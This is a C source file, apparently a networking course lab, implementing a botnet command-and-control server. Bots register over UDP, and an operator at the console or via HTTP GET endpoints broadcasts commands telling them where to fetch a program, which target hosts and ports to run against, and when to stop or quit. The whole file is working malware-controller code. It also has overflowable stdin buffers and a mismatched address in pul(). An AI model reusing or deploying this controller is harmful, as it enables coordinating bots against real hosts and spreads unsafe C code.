#include <netdb.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <stdarg.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <math.h>
#include <arpa/inet.h>

#include "pomocni.h"
#include "wrappers.h"

#define MAXLEN 1024
#define STDIN 0
#define BACKLOG 10
#define SI_COM_MAXLEN 6
#define MAX_BOTS 20
#define VERSION 25
#define BUFSIZE 65536 /* larger = more efficient */
#define ERROR 42
#define LOG 44
#define FORBIDDEN 403
#define NOTFOUND 404
#ifndef SIGCLD
#define SIGCLD SIGCHLD
#endif

void usage();

struct sockaddr_in bot_addr[MAX_BOTS];
int bot_num = 0;
int udp_sfd;
int listen_sfd;
int hit = 0;

void sendCommand(char *buff, size_t buffLen);

void pt();
void ptl();
void pu();
void pul();
void r();
void r2();
void s();
void l();
void q();
void sendFile(char *filename, char *buffer, int fd, char *fstr);
void sendStr(char *toSend, char *buffer, int fd, char *fstr);

struct
{
    char *ext;
    char *filetype;
} extensions[] = {
    {"gif", "image/gif"}, {"jpg", "image/jpg"}, {"jpeg", "image/jpeg"}, {"png", "image/png"}, {"ico", "image/ico"}, {"txt", "text/txt"}, {"pdf", "image/pdf"}, {"tar", "image/tar"}, {"htm", "text/html"}, {"html", "text/html"}, {0, 0}};

void logger(int type, char *s1, char *s2, int socket_fd)
{
    char logbuffer[BUFSIZE * 2];

    switch (type)
    {
    case ERROR:
        (void)sprintf(logbuffer, "ERROR: %s:%s Errno=%d exiting pid=%d", s1, s2, errno, getpid());
        break;
    case FORBIDDEN:
        (void)write(socket_fd, "HTTP/1.1 403 Forbidden\nContent-Length: 185\nConnection: close\nContent-Type: text/html\n\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\nThe requested URL, file type or operation is not allowed on this simple static file webserver.\n</body></html>\n", 271);
        (void)sprintf(logbuffer, "FORBIDDEN: %s:%s", s1, s2);
        break;
    case NOTFOUND:
        (void)write(socket_fd, "HTTP/1.1 404 Not Found\nContent-Length: 136\nConnection: close\nContent-Type: text/html\n\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\nThe requested URL was not found on this server.\n</body></html>\n", 224);
        (void)sprintf(logbuffer, "NOT FOUND: %s:%s", s1, s2);
        break;
    case LOG:
        (void)sprintf(logbuffer, " INFO: %s:%s:%d", s1, s2, socket_fd);
        break;
    }
    printf("HTTP LOGGER --> %s\n", logbuffer);
    if (type == ERROR || type == NOTFOUND || type == FORBIDDEN)
    {
        debug_printf("child exiting in logger\n");
        exit(3);
    }
}

/* this is a child web server process, so we can exit on errors */
void web(int fd, int hit)
{
    int j, buflen;
    long i, ret, len;
    char *fstr;
    static char buffer[BUFSIZE + 1]; /* static so zero filled */

    ret = read(fd, buffer, BUFSIZE); /* read Web request in one go */
    if (ret == 0 || ret == -1)
    { /* read failure stop now */
        logger(FORBIDDEN, "failed to read browser request", "", fd);
    }
    if (ret > 0 && ret < BUFSIZE) /* return code is valid chars */
        buffer[ret] = 0;          /* terminate the buffer */
    else
        buffer[0] = 0;
    for (i = 0; i < ret; i++) /* remove CF and LF characters */
        if (buffer[i] == '\r' || buffer[i] == '\n')
            buffer[i] = '*';
    logger(LOG, "request", buffer, hit);
    if (strncmp(buffer, "GET ", 4) && strncmp(buffer, "get ", 4))
    {
        logger(FORBIDDEN, "Only simple GET operation supported", buffer, fd);
    }

    for (i = 4; i < BUFSIZE; i++)
    { /* null terminate after the second space to ignore extra stuff */
        if (buffer[i] == ' ')
        { /* string is "GET URL " +lots of other stuff */
            buffer[i] = 0;
            break;
        }
    }
    for (j = 0; j < i - 1; j++) /* check for illegal parent directory use .. */
        if (buffer[j] == '.' && buffer[j + 1] == '.')
        {
            logger(FORBIDDEN, "Parent directory (..) path names not supported", buffer, fd);
        }
    if (!strncmp(&buffer[0], "GET /\0", 6) || !strncmp(&buffer[0], "get /\0", 6)) /* convert no filename to index file */
        (void)strcpy(buffer, "GET /index.html");
    
    //debug_printf("&buffer[5] is %s\n", &buffer[5]);
    // &buffer[5] is the relative path

    // REST STUFF BEGIN
    if (strcmp("bot/prog_tcp", &buffer[5]) == 0)
    {
        pt();
        sendStr("Komanda pt uspjesno izvrsena\n", buffer, fd, "text/html"); // child quits after sending
    }
    else if (strcmp("bot/prog_tcp_localhost", &buffer[5]) == 0)
    {
        ptl();
        sendStr("Komanda ptl uspjesno izvrsena\n", buffer, fd, "text/html"); // child quits after sending
    }
    else if (strcmp("bot/prog_udp", &buffer[5]) == 0)
    {
        pu();
        sendStr("Komanda pu uspjesno izvrsena\n", buffer, fd, "text/html"); // child quits after sending
    }
    else if (strcmp("bot/prog_udp_localhost", &buffer[5]) == 0)
    {
        pul();
        sendStr("Komanda pul uspjesno izvrsena\n", buffer, fd, "text/html"); // child quits after sending
    }
    else if (strcmp("bot/run", &buffer[5]) == 0)
    {
        r();
        sendStr("Komanda r uspjesno izvrsena\n", buffer, fd, "text/html"); // child quits after sending
    }
    else if (strcmp("bot/run2", &buffer[5]) == 0)
    {
        r2();
        sendStr("Komanda r2 uspjesno izvrsena\n", buffer, fd, "text/html"); // child quits after sending
    }
    else if (strcmp("bot/stop", &buffer[5]) == 0)
    {
        s();
        sendStr("Komanda s uspjesno izvrsena\n", buffer, fd, "text/html"); // child quits after sending
    }
    else if (strcmp("bot/list", &buffer[5]) == 0)
    {
        char full_list [MAX_BOTS * (NI_MAXHOST + NI_MAXSERV + 1 + 100)];
        full_list[0] = '\0';
        for (int j = 0; j < bot_num; j++)
        {
            char addrstr[NI_MAXHOST];
            inet_ntop(
                AF_INET,
                &(((struct sockaddr_in *)&bot_addr[j])->sin_addr),
                addrstr, 100);
            int port = get_in_port((struct sockaddr *)&bot_addr[j]);

            char toAdd [NI_MAXHOST + NI_MAXSERV + 1 + 100];
            sprintf(toAdd ,"Bot klijent %s:%d\n", addrstr, port);

            //debug_printf("adding %s to full list\n", toAdd);

            strcat(full_list, toAdd);
        }

        //debug_printf("full list is %s", full_list);

        sendStr(full_list, buffer, fd, "text/html"); // child quits after sending
        
    }
    else if (strcmp("bot/quit", &buffer[5]) == 0)
    {
        q();
        exit(0);
    }
    // REST STUFF END
    
    /* work out the file type and check we support it */
    buflen = strlen(buffer);
    fstr = (char *)0;
    for (i = 0; extensions[i].ext != 0; i++)
    {
        len = strlen(extensions[i].ext);
        if (!strncmp(&buffer[buflen - len], extensions[i].ext, len))
        {
            fstr = extensions[i].filetype;
            break;
        }
    }
    if (fstr == 0)
        logger(FORBIDDEN, "file extension type not supported", buffer, fd);

    

    sendFile(&buffer[5], buffer, fd, fstr);

    close(fd);

    debug_printf("file sent\n");
    debug_printf("child exiting normaly\n");

    exit(1);
}


void closeSock_and_quit()
{
    shutdown(udp_sfd, SHUT_RDWR);
    close(udp_sfd);
    exit(0);
}

void sig_alrm(int sig)
{
    debug_printf("vrijeme isteklo: %d\n", sig);
    return;
}

int main(int argc, char *argv[])
{
    signal(SIGINT, closeSock_and_quit);

    char t_port[NI_MAXSERV];

    if (argc == 2)
        strcpy(t_port, argv[1]);
    else if (argc > 2)
        usage();
    else
    {
        strcpy(t_port, "80");
    }
    // nas socket i mjesto za addresu posiljatelja

    struct sockaddr_in cli;
    socklen_t clilen;
    memset(&cli, 0, sizeof(cli));

    // ...
    struct addrinfo hints, *res;

    int error;

    // bindaj udp socket

    // hintovi za getaddrinfo
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET; // AF_INET6, AF_UNSPEC
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE; // socket za pasivni open, *.port


    error = getaddrinfo(NULL, "5555", &hints, &res);

    if (error)
        errx(1, "%s", gai_strerror(error));

    debug_printf("getaddrinfo finished\n");
    dbgPrintAddrinfo(res);

    // napravi socket pomocu addrinfo koji smo dobili gore
    udp_sfd = Socket(res->ai_family,
                     res->ai_socktype,
                     res->ai_protocol);

    // bind spclet pomocu addrinfo koji smo dobili gore
    Bind(udp_sfd,
         res->ai_addr,
         res->ai_addrlen);

    debug_printf("udp binded...\n");

    // bindaj tcp socket za poslužitelja

    struct sockaddr_in serv_addr;

    if ((listen_sfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        logger(ERROR, "system call", "socket", 0);

    debug_printf("http socket created\n");

    int port = atoi(t_port);
    if (port < 0 || port > 60000)
        logger(ERROR, "Invalid port number (try 1->60000)", argv[1], 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(port);
    if (bind(listen_sfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        logger(ERROR, "system call", "bind", 0);

    debug_printf("http socket binded\n");

    setReuseAddr(listen_sfd);
    if (listen(listen_sfd, 64) < 0)
        logger(ERROR, "system call", "listen", 0);

    debug_printf("http socket listening\n");

    // pripremi za select

    // master fd set
    fd_set master_set;
    fd_set read_fds;
    int fdmax = (udp_sfd > listen_sfd) ? udp_sfd : listen_sfd;

    FD_ZERO(&master_set);
    FD_ZERO(&read_fds);

    FD_SET(udp_sfd, &master_set);
    FD_SET(listen_sfd, &master_set);
    FD_SET(STDIN, &master_set);

    int msglen;
    while (1)
    {
        read_fds = master_set;

        debug_printf("selecting...\n");

        Select(fdmax + 1, &read_fds, NULL, NULL, NULL);

        int i;
        for (i = 0; i <= fdmax; i++)
        {
            if (FD_ISSET(i, &read_fds))
            {
                if (i == STDIN)
                {
                    debug_printf("primljeno nesto s STDIN\n");
                    char c;
                    char buff1[1024];
                    int j = 0;
                    while (read(STDIN, &c, 1) > 0)
                    {
                        if (c == '\0' || c == '\n')
                        {
                            break;
                        }
                        buff1[j] = c;
                        j++;
                    }
                    buff1[j] = '\0';

                    debug_printf("procitano s stdin: %s\n", buff1);
                    char command[SI_COM_MAXLEN];

                    for (j = 0; j < (int)strlen(buff1); j++)
                    {
                        //debug_printf("%c\n",buff[j]);
                        if (buff1[j] == ' ')
                            break;
                        command[j] = buff1[j];
                    }
                    command[j] = '\0';

                    debug_printf("komanda je %s\n", command);

                    if (strcmp("pt", command) == 0)
                    {
                        pt();
                    }
                    else if (strcmp("ptl", command) == 0)
                    {
                        ptl();
                    }
                    else if (strcmp("pu", command) == 0)
                    {
                        pu();
                    }
                    else if (strcmp("pul", command) == 0)
                    {
                        pul();
                    }
                    else if (strcmp("r", command) == 0)
                    {
                        r();
                    }
                    else if (strcmp("r2", command) == 0)
                    {
                        r2();
                    }
                    else if (strcmp("s", command) == 0)
                    {
                        s();
                    }
                    else if (strcmp("l", command) == 0)
                    {
                        l();
                    }
                    else if (strcmp("n", command) == 0)
                    {
                        char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
                        strcpy(buff, "'NEPOZNATA'\n");
                        sendCommand(buff, sizeof "'NEPOZNATA'\n");
                    }
                    else if (strcmp("q", command) == 0)
                    {
                        q();
                        exit(0);
                    }
                    else if (strcmp("h", command) == 0)
                    {
                        // dont ask
                        printf("Stdin Opis\\n\npt bot klijentima salje poruku PROG_TCP (struct MSG:1 10.0.0.20 1234\\n)\nptl bot klijentima salje poruku PROG_TCP (struct MSG:1 127.0.0.1 1234\\n)\npu bot klijentima salje poruku PROG_UDP (struct MSG:2 10.0.0.20 1234\\n)\npul bot klijentima salje poruku PROG_UDP (struct MSG:2 127.0.0.1 1234\\n)\nr bot klijentima salje poruku RUN s adresama lokalnog racunala:\nstruct MSG:3 127.0.0.1 vat localhost 6789\\n\nr2 bot klijentima salje poruku RUN s adresama racunala iz IMUNES-a:\nstruct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notes\ns bot klijentima salje poruku STOP (struct MSG:4)\nl lokalni ispis adresa bot klijenata\nn salje poruku: ’NEPOZNATA’\\n\nq bot klijentima salje poruku QUIT i zavrsava s radom (struct MSG:0)\nh ispis naredbi\n");
                    }
                }
                else if (i == listen_sfd)
                {
                    // HTTP stvari ovdje
                    debug_printf("tcp listen socket je citljiv\n");

                    struct sockaddr_in their_addr;
                    socklen_t sin_size = sizeof(their_addr);
                    char hbuf[NI_MAXHOST], sbuf[NI_MAXSERV];

                    // ne blokirajuci accept
                    int newfd;
                    if ((newfd = accept(listen_sfd, (struct sockaddr *)&their_addr, &sin_size)) < 0)
                        logger(ERROR, "system call", "accept", 0);

                    debug_printf("accepted\n");

                    // who connected? for debugging purposes only
                    if ((error = Getnameinfo((struct sockaddr *)&their_addr, sin_size,
                                             hbuf, sizeof(hbuf), sbuf, sizeof(sbuf),
                                             NI_NUMERICHOST | NI_NUMERICSERV)))
                    {
                        errx(1, "%s", gai_strerror(error));
                    }
                    debug_printf("got connection from %s:%s\n", hbuf, sbuf);

                    int pid;
                    if ((pid = fork()) < 0)
                    {
                        logger(ERROR, "system call", "fork", 0);
                    }
                    else
                    {
                        if (pid == 0)
                        { /* child */
                            debug_printf("child is %d\n", getpid());
                            (void)close(listen_sfd);
                            web(newfd, hit++); /* never returns */
                        }
                        else
                        { /* parent */
                            sleep(1);
                            debug_printf("parrent continuing\n");
                            (void)close(newfd);
                        }
                    }
                }
                else if (i == udp_sfd)
                {
                    debug_printf("udp socket je citljiv\n");
                    debug_printf("registracija bota?\n");

                    char recievedMsg[MAXLEN];

                    clilen = sizeof(cli);
                    msglen = Recvfrom(udp_sfd, recievedMsg, MAXLEN, 0, (struct sockaddr *)&cli, &clilen);
                    recievedMsg[msglen] = 0; // za printf i usporedbu dolje, ne utjece na sendto()

                    debug_printf("recieved %s\n", recievedMsg);

                    if (strcmp("REG\n", recievedMsg) == 0)
                    {
                        debug_printf("bot poslao REG\n");

                        printf("Bot klijent ");
                        printAddrip4_fromAddr_in(&cli);
                        printf("\n");

                        bot_addr[bot_num++] = cli;

                        debug_printf("bot dodan u listu\n");
                    }
                }
            }
        }
    }
}

void usage()
{
    fprintf(stderr, "%s\n", "Usage:  ./CandC [tcp_port]");
    exit(1);
}

void sendCommand(char *buff, size_t buffLen)
{
    for (int i = 0; i < bot_num; i++)
    {
        Sendto(udp_sfd, buff, buffLen, 0, (struct sockaddr *)&bot_addr[i], sizeof(struct sockaddr));
    }
}

void pt()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '1';
    strncpy(buff + 1, "10.0.0.20", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN + 1, "1234", 22);
    sendCommand(buff, INET_ADDRSTRLEN + 1 + 22);
}
void ptl()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '1';
    strncpy(buff + 1, "127.0.0.1", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN + 1, "1234", 22);
    sendCommand(buff, INET_ADDRSTRLEN + 1 + 22);
}
void pu()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '2';
    strncpy(buff + 1, "10.0.0.20", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN + 1, "1234", 22);
    sendCommand(buff, INET_ADDRSTRLEN + 1 + 22);
}
void pul()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '2';
    strncpy(buff + 1, "10.0.0.20", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN + 1, "1234", 22);
    sendCommand(buff, INET_ADDRSTRLEN + 1 + 22);
}
void r()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '3';
    strncpy(buff + 1, "127.0.0.1", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN + 1, "vat", 22);
    strncpy(buff + INET_ADDRSTRLEN + 1 + 22, "localhost", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN * 2 + 1 + 22, "6789", 22);
    sendCommand(buff, INET_ADDRSTRLEN * 2 + 1 + 22 * 2);
}
void r2()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '3';
    strncpy(buff + 1, "20.0.0.11", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN + 1, "1111", 22);
    strncpy(buff + INET_ADDRSTRLEN + 1 + 22, "20.0.0.12", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN * 2 + 1 + 22, "2222", 22);
    strncpy(buff + INET_ADDRSTRLEN * 2 + 1 + 22 * 2, "20.0.0.13", INET_ADDRSTRLEN);
    strncpy(buff + INET_ADDRSTRLEN * 3 + 1 + 22 * 2, "dec-notes", 22);
    sendCommand(buff, INET_ADDRSTRLEN * 3 + 1 + 22 * 3);
}
void s()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '4';
    sendCommand(buff, 1);
}
void l()
{
    for (int j = 0; j < bot_num; j++)
    {
        printAddrip4_fromAddr_in((struct sockaddr_in *)&bot_addr[j]);
        printf("\n");
    }
}
void q()
{
    char buff[1 + 20 * (22 + INET_ADDRSTRLEN)];
    buff[0] = '0';
    sendCommand(buff, 1);
    close(listen_sfd);
    close(udp_sfd);
    debug_printf("BYE!\n");
}

void sendFile(char *filename, char *buffer, int fd, char *fstr)
{
    int file_fd;
    if ((file_fd = open(filename, O_RDONLY)) == -1)
    { /* open the file for reading */
        logger(NOTFOUND, "failed to open file", filename, fd);
    }
    logger(LOG, "SEND", filename, hit);
    long len = (long)lseek(file_fd, (off_t)0, SEEK_END);                                                                                           /* lseek to the file end to find the length */
    (void)lseek(file_fd, (off_t)0, SEEK_SET);                                                                                                      /* lseek back to the file start ready for reading */
    (void)sprintf(buffer, "HTTP/1.1 200 OK\nServer: nweb/%d.0\nContent-Length: %ld\nConnection: close\nContent-Type: %s\n\n", VERSION, len, fstr); /* Header + a blank line */
    logger(LOG, "Header", buffer, hit);
    (void)write(fd, buffer, strlen(buffer));

    /* send file in 8KB block - last block may be smaller */
    size_t ret;
    while ((ret = read(file_fd, buffer, BUFSIZE)) > 0)
    {
        (void)write(fd, buffer, ret);
    }
    sleep(1); /* allow socket to drain before signalling the socket is closed */
}

void sendStr(char *toSend, char *buffer, int fd, char *fstr)
{
    int temp_file_fd;

    if ((temp_file_fd = open("temp.html", O_CREAT | O_WRONLY, 0644)) >= 0)
    {
        char *tempbuff = "<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <p>\n";
        (void)write(temp_file_fd, tempbuff, strlen(tempbuff));

        (void)write(temp_file_fd, toSend, strlen(toSend));
        tempbuff = "    </p>\n</body>\n</html>\n";
        (void)write(temp_file_fd, tempbuff, strlen(tempbuff));
        (void)close(temp_file_fd);
    }
    else
    {
        printf("couldn't create temp file\n");
        close(fd);
        exit(1);
    }
    sendFile("temp.html", buffer, fd, fstr);

    close(fd);

    debug_printf("file sent\n");
    debug_printf("child exiting normaly\n");

    exit(1);
}
